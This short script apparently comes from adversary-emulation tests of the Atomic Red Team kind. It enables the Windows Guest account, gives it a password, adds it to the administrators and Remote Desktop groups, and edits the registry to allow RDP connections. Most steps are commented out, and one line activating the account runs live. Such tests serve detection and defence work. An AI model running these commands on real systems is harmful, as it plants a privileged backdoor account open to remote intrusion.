#Atomic Test 1 - Enable Guest account with RDP capability and admin privileges

#


# net user #{guest_user} /active:yes
# net user #{guest_user} #{guest_password}
# net localgroup #{local_admin_group} #{guest_user} /add
# net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /add
# reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f

#Atomic Test 2 - Activate Guest Account

Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "net user guest /active:yes"'